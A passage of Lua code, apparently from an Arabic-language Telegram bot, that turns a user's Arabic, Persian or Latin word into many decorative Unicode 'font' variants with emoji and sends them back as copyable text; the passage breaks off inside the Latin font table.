DevAbs:del(loolIQ.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_)     
if not text:find('[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]') then 
ABS_PROX = zakrf 
local font_base = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local font_abs = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local fonts = {      "ضـٍہًہ,صًـٍـًہ,ـᓆـ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,ـפֿـ,ـפـ,ج,ش,ـωـ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظٍـً,طہـۛ,ز,ر,ـב,پ,ـפּـ,ڪٰྀہٰٰٖـ,گـ,ثِْْہٰٰہٰٰہٰٰـ,ژ,ذَِِِْ,آ,ئ,.,_",      
"ضۜۜہٰٰ,صۛہُُِِٰٰۛہٰٰۛہٰٰ,قྀ̲ہٍٍٰٰٰٰٰྀ̲ہٰٰٰྀ̲ہٰٰٰ,ف͒ہِِٰٰٰٰ͒ہٰٰ͒ہٰٰ,غہِِِِٰٰٰٰہٰٰہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہّّٰٰٰ̐ہٰ̐ہ,حہٌٌٰٰٰٰہٰٰہٰٰ,جًًِِّّْْْۧۧۧ,شِٰہََُُِٰٰٰہِٰٰٰہٰٰ,سٌٌٍٍٰٰٰٰٰٰٓٓٓ,ی,بّہٌٌِِّٰٰہّہ,لْْٰٰ,آ,نَِٰہٍٍَِٰٰٰہَِٰہ,تَہََّّٰٰٰہََٰہَٰ,مٰ̲ہٍٍٰٰٰ̲ہٰ̲ہ,چ,ظۗہََِِْْٰٰۗہٰٰۗہٰٰ,طۨہََُُِِٰٰۨہٰٰۨہٰٰ,زًًَََََ,رِِٰٰ,دِِٰٰ,پ,وٍٍِِِّّ,ڪٰྀہٰٰٖ,گ,ثہِِْْْْٰٰہٰٰہٰٰ,ژ,ذََِِِْْ,ئ,آ,.,_",      
"ضــ,صــ,قــ,فــ,غــ,عــ,ـهــ,خــ,حــ,جــ,شــ, سـ,یــ,بــ,لــ,ﺂ,نــ,تــ,مــ,چــ,ظــ,طــ,ـز,ـر,ـد,پــ,ـو,کــ,گــ,ـثــ,ـژ,ـذ,ﺂ,ئ,.,_",        
"ضۜہٰٰ,صۛہٰٰ,قྀ̲ہٰٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہ,حہٰٰ,جْۧ,شِٰہٰٰ,سٰٰٓ,ی,بّہ,ل,آ,نَِٰہ,تَہَٰ,مٰ̲ہ,چ,ظۗہٰٰ,طۨہٰٰ,زَ,ر,د,پ,وِ,ک,گ,ثہٰٰ,ژ,ذِ,ئ,آ,.,_",      
"ضًً,صــَ,ق,ف,غً,عـًً,هہـ,خِہ,ـحّ,جــٌ,ڜ,سُُُُُ,ی,بــِ,لـ,أ,نــہٰ⇣ـ,ِِتً,مہـً,چ,ظـَ,ط,ز,ر,د,پ,وُ,ﮏ,گ,ثـ͜͡ہــِ,ژ,ذ,ئ,أ  ,.,_",      
"ضًـٍـًہًـٍـًہ,صًـٍـًہ,ق,ف,غً,عً,هہـ,خِہ,ב,,جـﮩ๋͜ﮧـ͜ާْ,ڜـ͜ާ,سـّــً,ی,بہ,لـﮩﮨہٰٰہٰ,أ,טּ,تہٍِۣـّ̐ہٰ,مہ,چ,ظٍـًہ,ط,ز,ر,د,پ,وُ,ڪـ,گ,ثہـٰ̲ہٰٰ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غـ͜ﮩ͞ـ,عـ͜ﮩ͞ـ,هہـۛ,خہـۛ,ﺣہـۛ,جہـۛ,شۖہـۛ,سۜہـۛ,ی,بـ,ل,اآ,نہـۛ,تـ͜ﮩ͞ـ,مہـۛ,چ,ظـ͜ـ,طہـۛ,ز,ر,د,پ,ؤ,كـ͜ﮩ,گ,ثۨہـۛ,ژ,ذ,ئ,اآ  ,.,_",      
"ضـ͜,صـ,ق,فـ͜ـ,غہۛـۛ,عۛـۛ,ه๋͜‏ـ,خ,ح,ج,شـ͜ﮩ͞ـ,سـ͜ﮩ͞ـ,ی,ﯧـۛ,لـۛ,اآ,نـ͜ـ,ت,م͜͞ـ,چ,ظـۛ,ط๋͜‏ـ,ز,ر,د,پ,وُ,كـهـۛ,گ,ث,ژ,ذ,ئ,اآ  ,.,_",      
"ض๋͜‏ـۣۛ,صـ๋͜‏ـۣۛ,قـ,فـ๋͜‏ـۣۛ,غـ๋͜‏ـۣۛـ,عـ๋͜‏ـ,ه,خـ๋͜‏ـۣ,حـ๋͜‏ـ,,جـ๋͜‏ـ,شـ๋͜‏ـ,سـ๋͜‏ـ,ی,بہ,ل,أ,ن,تـ๋͜‏ـ,م,چ,ظـ๋͜‏ـ,ط,ز,ر,د,پ,و,كـ๋͜‏ـ,گ,ثہ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غ,ع,هـ͜ﮩ͞ـ,خ,ح,ج,ش,س,ی,ب,لـّﮩ๋͜‏ـ,آ,نہٰٰ,ྀ̲تہٰٰ,مـّﮩ๋͜‏ـ,چ,طـྀ̲͜ہٰٰ,طـ͜ﮩ͞ـ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صۛہٰٰ,قྀ̲ہٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,خٰ̐ہ,حہٰٰ,جْہ,شِٰہٰٰ,سٰٓہ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظہٰٰྀ̲,طہٰٰ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صـﮩ๋͜‏ـ,قـﮩ๋͜‏ـ,فـﮩ๋͜‏ـ,غـﮩ๋͜‏ـ,؏ـﮩ๋͜‏ـ,هـﮩ๋͜‏ـ,خـﮩ๋͜‏ـ,حـﮩ๋͜‏ـ,جـﮩ๋͜‏ـ,شـﮩ๋͜‏ـ,سـﮩ๋͜‏ـ,ی,بـﮩ๋͜‏ـ,لّۣۗ,آِ,نْۛ,تٌۙ,ﻡِۙـ,چ,ظـﮩ๋͜‏ـۖۜ,طٌۗ,ﺯۖ,ږۙ,ڊْ,پ,ﯠۚ,ڪٌۘ,گ,ثٌّۜ,ژ,ﺫۗ,ئ,آِ  ,.,_",      
"ض,صـ᷈͟ـ,قـ᷈͟ـ,فـ᷈͟ـ,غـ᷈͟ـ,عـ᷈͟ـ,هـ᷈͟ـ,خـ᷈͟ـ,حـ᷈͟ـ,جـ᷈͟ـ,شـ᷈͟ـ,سـ᷈͟ـ,ی,بـ᷈͟ـ,لـ᷈͟ـ,ٲآٲ,نـ᷈͟ـ,تـ᷈͟ـ,مـ᷈͟ـ,چ,ظـ᷈͟ــ᷈͟ـ,طـ᷈͟ـ,ز,ر,د,پ,ﯠ,كـ᷈͟ـ,گ,ثـ᷈͟ـ,ژ,ذ,ئ,ٲآٲ  ,.,_",      
"ض,صـﮩ⃑ﮩ,قـﮩ⃑ﮩ,فـﮩ⃑ﮩ,غـﮩ⃑ﮩ,عـﮩ⃑ﮩ,هـﮩ⃑ﮩ,خـﮩ⃑ﮩ,حـﮩ⃑ﮩ,جـﮩ⃑ﮩ,شـﮩ⃑ﮩ,سـﮩ⃑ﮩ,ی,بـﮩ⃑ﮩ,لـﮩ⃑ﮩ,آ,نـﮩ⃑ﮩ,تـﮩ⃑ﮩ,مـﮩ⃑ﮩ,چ,ظـﮩ⃑ﮩـﮩ⃑ﮩ,طـﮩ⃑ﮩ,ڒ,ر,ډ,پ,ﯛ,كـﮩ⃑ﮩ,گ,ثـﮩ⃑ﮩ,ژ,ﮈ,ئ,آ  ,.,_",      
"ضًـٍـًہ,صًـ,ـقـ,ف,غً,عًـ,هہ,خِہ,حـ,جْـ,ڜـ,ڛً,ی,بہ,ل,آ,ہن,تہ,م,چ,ظٍـً,طٍـًہ,ز,ڑ,دٍ,پ,وُ,ـڪـ,گ,ثـ,ژ,ذٍ,ئ,آ  ,.,_",      
"ضہۣۗ,صہۣۗ,قَہۣۗـ,فُہۣۗ,غّہۣۗ,عَہۣۗ,هہۣۗ,خٌہۣۗ,حًہۣۗ,جَہۣۗ,شّہۣۗ,سہۣۗـ,ی,بّہۣۗـ,لًً,أ,نٌہۣۗـ,تُہۣۗ,مہۣۗ,چ,ظٌہۣۗ,طٌہۣۗـ,زُ,رُ,دُ,پ,وِ,كہۣۗ,گ,ثًہۣۗ,ژ,ذٌ,ئ,أ  ,.,_",      
"ض,صۭۣۣۖـ,قۭۣۣۖـ,فۭۣۣۖـ,غۭۣۣۖـ,غۭۣۣۖـ,هۭۣۣۖـ,خۭۣۣۖـ,حۭۣۣۖـ,جۭۣۣۖـ,شۭۣۣۖـ,سۭۣۣۖـ,ی,بۭۣۣۖـ,لۭۣۣۖـ,آ,نۭۣۣۖـ,تۭۣۣۖـ,مۭۣۣۖـ,چ,ظۭۣۣۖـۭۣۣۖـ,طۭۣۣۖـ,ز,ر,د,پ,ﯠ,كۭۣۣۖـ,گ,ثۭۣۣۖـ,ژ,ذ,ئ,آ  ,.,_",      
"ض,صـﮩـ,قـﮩـ,فـﮩـ,غـﮩـ,عـﮩـ,هـﮩـ,خـﮩـ,حـﮩـ,جـﮩـ,شـﮩـ,سـﮩـ,ی,بـﮩـ,لـﮩـ,ٲ,نـﮩـ,تـﮩـ,مـﮩـ,چ,ظـﮩــﮩـ,طـﮩـ,ز,ر,د,پ,و,ګ,گ,ثـﮩـ,ژ,ذ,ئ,ٲ,.,_",      
"ض,صـٰٰـۛۛۛ,قـٰٰـۛۛۛ,فـٰٰـۛۛۛ,غـٰٰـۛۛۛ,عـٰٰـۛۛۛ,هـٰٰـۛۛۛ,خـٰٰـۛۛۛ,حـٰٰـۛۛۛ,جـٰٰـۛۛۛ,شـٰٰـۛۛۛ,سـٰٰـۛۛۛ,ی,بـٰٰـۛۛۛ,لـٰٰـۛۛۛ,أ,نـٰٰـۛۛۛ,تـٰٰـۛۛۛ,مـٰٰـۛۛۛ,چ,ظـٰٰـۛۛۛـٰٰـۛۛۛ,طـٰٰـۛۛۛ,ز,ر,د,پ,و,ک,گ,ثـٰٰـۛۛۛ,ژ,ذ,ئ,أ  ,.,_",      
"ض,صـٰ۫ﹻ,قـٰ۫ﹻ,فـٰ۫ﹻ,غـٰ۫ﹻ,عـٰ۫ﹻ,هـٰ۫ﹻ,خـٰ۫ﹻ,حـٰ۫ﹻ,جـٰ۫ﹻ,شـٰ۫ﹻ,سـٰ۫ﹻ,ی,بـٰ۫ﹻ,لـٰ۫ﹻ,ٱ,نَـٰ۫ﹻ,تْـٰ۫ﹻ,مٌـٰ۫ﹻ,چ,ظٌـٰ۫ﹻـٰ۫ﹻ,طِـٰ۫ﹻ,زُ,رَ,دِ,پ,وَ,كِـٰ۫ﹻ,گ,ثُـٰ۫ﹻ,ژ,ذَ,ئ,ٱℓ  ,.,_",      
"ض,صہٰـ͢͡,قہٰـ͢͡,فہٰـ͢͡,غہٰـ͢͡,عہٰـ͢͡,هہٰـ͢͡,خہٰـ͢͡,حہٰـ͢͡,جہٰـ͢͡,شہٰـ͢͡,سہٰـ͢͡,ی,بہٰـ͢͡,لہٰـ͢͡,ا,نہٰـ͢͡,تہٰـ͢͡,مہٰـ͢͡,چ,ظہٰـ͢͡ہٰـ͢͡,طہٰـ͢͡,ز,ر,د,پ,و,كہٰـ͢͡,گ,ثہٰـ͢͡,ژ,ذ,ئ,ا  ,.,_",       }  
local result = {}   
i=0  
for k=1,#fonts do   
i=i+1   
local tar_font = fonts[i]:split(",")   
local text = ABS_PROX   
local text = text:gsub("ض",tar_font[1])     
local text = text:gsub("ص",tar_font[2])     
local text = text:gsub("ق",tar_font[3])     
local text = text:gsub("ف",tar_font[4])     
local text = text:gsub("غ",tar_font[5])     
local text = text:gsub("ع",tar_font[6])     
local text = text:gsub("ه",tar_font[7])     
local text = text:gsub("خ",tar_font[8])     
local text = text:gsub("ح",tar_font[9])     
local text = text:gsub("ج",tar_font[10])     
local text = text:gsub("ش",tar_font[11])     
local text = text:gsub("س",tar_font[12])     
local text = text:gsub("ی",tar_font[13])     
local text = text:gsub("ب",tar_font[14])     
local text = text:gsub("ل",tar_font[15])     
local text = text:gsub("ا",tar_font[16])     
local text = text:gsub("ن",tar_font[17])     
local text = text:gsub("ت",tar_font[18])     
local text = text:gsub("م",tar_font[19])     
local text = text:gsub("چ",tar_font[20])     
local text = text:gsub("ظ",tar_font[21])     
local text = text:gsub("ط",tar_font[22])     
local text = text:gsub("ز",tar_font[23])     
local text = text:gsub("ر",tar_font[24])     
local text = text:gsub("د",tar_font[25])    
local text = text:gsub("پ",tar_font[26])     
local text = text:gsub("و",tar_font[27])     
local text = text:gsub("ک",tar_font[28])     
local text = text:gsub("گ",tar_font[29])     
local text = text:gsub("ث",tar_font[30])     
local text = text:gsub("ژ",tar_font[31])     
local text = text:gsub("ذ",tar_font[32])     
local text = text:gsub("ئ",tar_font[33])     
local text = text:gsub("آ",tar_font[34])      
table.insert(result, text)   
end   
local DevAbs22 = "❗️🚸 ⌯ ٱڵكڵمة { "..ABS_PROX.." }\n❗️🔑 ⌯ تـۖمت زخرفتهٱ ٱڵى ( "..tostring(#fonts).." ) نوع \n❗️🎗 ⌯ ٱضـغط عڵى ٱڵـكڵمة ڵـنسخهٱ\n〰️➖〰️➖〰️➖〰️➖〰️\n"
number=0   
for v=1,#result do  
number=number+1   
local ABS_PROX = { ' 🔥📥 ', '🔅🔥﴿', '  ❥˓  ', '💝﴿ֆ', '  🐼🏆', ' 🙊💙', '-🐥📥 ', ' 〄😻‘',' ⚡️', '- ⁽🌷', '🔥“', '💭', '', '🎩🍿','“̯ 🐼💗 ', '🐝🍷','❥̚͢₎ 🐣', '👄‘', ' 💭ۦ', ' 💛💭ۦ', ' ⚡️ۦ','℡ᴖ̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ 📥🐯⇣✦', '┇♩⁽💎🌩₎⇣✿','ۦٰ‏┋❥ ͢˓🦁💛ۦ‏', '⚡️♛ֆ₎', '♛⇣🐰☄️₎✦', '⁾⇣✿💖┇❥', ' ₎✿🎃 ┇“❥', '😴✿⇣', '❥┇⁽ ℡🦁' }   
DevAbs22 = DevAbs22..''..number.."  `"..result[number]..''..ABS_PROX[math.random(#ABS_PROX)].."`\n\n"    
end  
Dev_Abs(msg.chat_id_, 0, 1, DevAbs22, 1, 'md') 
end 
end 
if DevAbs:get(loolIQ.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then       
local zakrf = text:match("(.*)")       
DevAbs:del(loolIQ.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_)         
if not text:find("[\216-\219][\128-\191]") then      
ABS_PROX = zakrf     
local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"     
local font_abs = "z,y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,i,h,g,f,e,d,c,b,a,Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A,0,1,2,3,4,5,6,7,8,9,.,_"     
local fonts = {            "Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1,.,_",     
"п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐,к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙۪۪,卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙,0,9,8,7,6,5,4,3,2,1,.,_",     
"ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",     
"a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k̷,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",     
"Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆,K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,0,9,8,7,6,5,4,3,2,1,.,_",     
"۪۫a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,۪۫y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,۪۪۫۫,0۪۪۫۫,9۪۪۫۫,8۪۪۫۫,7۪۪۫۫,6۪۪۫۫,5۪۪۫۫,4۪۪۫۫,3۪۪۫۫,2۪۪۫۫,1۪۪۫۫,.۪۪۫۫,_",     
"͜͡Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,ؔؔ͜͜Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,͜͡0,9,8,7,6,5,4,3,2,1,.,_",     
"A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,̶̶A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     
